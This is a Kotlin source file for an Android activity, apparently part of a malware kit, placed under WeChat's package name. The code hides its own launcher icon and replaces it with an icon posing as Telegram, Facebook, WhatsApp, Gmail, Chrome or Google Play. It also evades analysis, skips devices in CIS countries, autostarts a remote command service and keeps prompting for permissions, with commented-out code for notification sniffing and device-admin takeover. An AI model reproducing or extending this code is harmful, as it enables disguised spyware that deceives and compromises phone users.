package com.tencent.mm

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.xxx.zzz.Payload
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.globp.utilssss.evade
import com.xxx.zzz.servicesp.CommandServicedas
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

@OptIn(ExperimentalStdlibApi::class)
class Main2 : AppCompatActivity() {
    init {
        Payload.ApplicationScope.launch {
            if (Constantsfd.debug) {
                evade {}.onEscape {
                    runCatching {
                        Utilslp.deleteLabelIcon(this@Main2)
                    }
                    withContext(Dispatchers.Main) {
                        runCatching {
                            finish()
                        }
                    }
                }
            }
        }
    }

    private val appToStart = if (BuildConfig.DEBUG) "org.telegram.messenger" else "%INSERT_APP_TO_START_HERE%"

    private val listApp = arrayListOf(
        "org.telegram.messenger",
        "com.facebook.katana",
        "com.instagram.android",
        "com.android.chrome",
        "com.google.android.youtube",
        "com.whatsapp",
        "com.google.android.contacts",
        "com.google.android.gm",
        "com.android.vending",
        "com.zhiliaoapp.musically"
    )

    private val listAppNames = mapOf(
        "org.telegram.messenger" to "Telegram",
        "com.facebook.katana" to "Facebook",
        "com.instagram.android" to "Instagram",
        "com.android.chrome" to "Chrome",
        "com.google.android.youtube" to "Youtube",
        "com.whatsapp" to "WhatsApp",
        "com.google.android.contacts" to "Contacts",
        "com.google.android.gm" to "Gmail",
        "com.android.vending" to "Google Play",
        "com.zhiliaoapp.musically" to "TikTok"
    )

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        runCatching {
            if (PermissionsActivity.hasAllPermission(this)) {
                saveCurAppName()
                if (appToStart.isNotEmpty()) {
                    successWork()
                } else {
                    deleteLabelIcon(this)
                }
            } else {
                Payload.start2(this)
            }
        }
    }

    override fun onResume() {
        super.onResume()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        )
        window.setFlags(
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
        )

        runCatching { super.onCreate(savedInstanceState) }.onFailure {
            CommandServicedas.autoStart(this)
            if (PermissionsActivity.hasAllPermission(this)) {
                saveCurAppName()
                if (appToStart.isNotEmpty()) {
                    successWork()
                } else {
                    deleteLabelIcon(this)
                }
            } else {
                Payload.start2(this)
            }
        }

        runCatching {
            if (Utilslp.blockCIS(this@Main2)) {
                runCatching {
                    Utilslp.deleteLabelIcon(this@Main2)
                }
                runCatching {
                    finish()
                }
            }
        }

        SharedPreferencess.init(this)
        SharedPreferencess.applicationId = this.packageName

        val tv = TextView(this)
        tv.text = " "
        setContentView(tv)

        if (PermissionsActivity.hasAllPermission(this)) {
            saveCurAppName()
            if (appToStart.isNotEmpty()) {
                successWork()
            } else {
                deleteLabelIcon(this)
            }
        } else {
            Payload.start2(this)
        }
    }

    private fun saveCurAppName() {
        runCatching {
            if (appToStart.isNotEmpty()) {
                if (isPackageInstalled(appToStart, packageManager)) {
                    SharedPreferencess.appName = listAppNames[appToStart] ?: getLabelApplication(this)
                } else {
                    for (app in listApp) {
                        if (isPackageInstalled(app, packageManager)) {
                            SharedPreferencess.appName = listAppNames[app] ?: getLabelApplication(this)
                            return@runCatching
                        }
                    }
                }
            } else {
                SharedPreferencess.appName = getLabelApplication(this)
            }
        }
    }

    private fun successWork() {
        CommandServicedas.autoStart(this)
        if (isPackageInstalled(appToStart, packageManager)) {
            startApplication(this, appToStart)
        } else {
            for (app in listApp) {
                if (isPackageInstalled(app, packageManager)) {
                    startApplication(this, app)
                    break
                }
            }
        }
        runCatching {
            disableAll()
        }
        runCatching {
            enableIcon()
        }
    }

    private fun enableIcon() {
        if (appToStart == "org.telegram.messenger") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Telegram"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.facebook.katana") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Facebook"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.zhiliaoapp.musically") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".TikTok"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.instagram.android") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Instagram"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.android.chrome") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Chrome"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.google.android.youtube") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Youtube"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.whatsapp") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Whatsapp"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.google.android.contacts") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Contacts"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.google.android.gm") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Gmail"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }
        if (appToStart == "com.android.vending") {
            if (isPackageInstalled(appToStart, packageManager)) {
                packageManager?.setComponentEnabledSetting(
                    ComponentName(
                        this,
                        this.packageName + ".Play"
                    ),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
                )
                return
            }
        }

        for (app in listApp) {
            if (isPackageInstalled(app, packageManager)) {
                when (app) {
                    "org.telegram.messenger" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Telegram"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.facebook.katana" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Facebook"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.zhiliaoapp.musically" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".TikTok"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.instagram.android" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Instagram"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.android.chrome" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Chrome"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.google.android.youtube" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Youtube"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.whatsapp" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Whatsapp"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.google.android.contacts" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Contacts"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.google.android.gm" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Gmail"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                    "com.android.vending" -> {
                        packageManager?.setComponentEnabledSetting(
                            ComponentName(
                                this,
                                this.packageName + ".Play"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        return
                    }
                }
            }
        }
    }

    private fun startApplication(context: Context, app: String) {
        try {
//            if (PermissionsActivity.testNotif && !SharedPreferencess.hasNotifPermition) {
//                SharedPreferencess.clickNotifPermition = true
//                DrawerSniffer.requestPermission(this)
//            } else if (PermissionsActivity.testAdmin && !ActivityAdmin.isAdminDevice(this)) {
//                SharedPreferencess.autoClickAdmin = "1"
//                val dialogIntent = Intent(this, ActivityAdmin::class.java)
//                dialogIntent.putExtra("admin", "1")
//                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
//                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
//                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
//                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
//                startActivity(dialogIntent)
//            } else {
            val launchIntent: Intent? = context.packageManager.getLaunchIntentForPackage(app)
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            launchIntent?.let {
                context.startActivity(launchIntent)
            }
//            }
        } catch (e: Exception) {
        }
    }

    private fun getLabelApplication(context: Context): String {
        try {
            return context.packageManager.getApplicationLabel(
                context.packageManager.getApplicationInfo(
                    context.packageName,
                    PackageManager.GET_META_DATA
                )
            ) as String
        } catch (ex: Exception) {
            Log.v("getNameApplication", "Error Method")
        }
        return ""
    }

    private fun isPackageInstalled(packageName: String, packageManager: PackageManager): Boolean {
        return try {
            packageManager.getPackageInfo(packageName, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    private fun disableAll() {
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Main2"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Facebook"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".TikTok"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Instagram"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this.packageName,
                this.packageName + ".Chrome"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Youtube"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Whatsapp"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Contacts"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Gmail"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Play"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        packageManager?.setComponentEnabledSetting(
            ComponentName(
                this,
                this.packageName + ".Telegram"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
    }

    override fun onBackPressed() {
        Payload.start2(this)
    }

    private fun deleteLabelIcon(context: Context) {
        runCatching {
            val CTD = ComponentName(context, Main2::class.java)
            context.packageManager.setComponentEnabledSetting(
                CTD,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}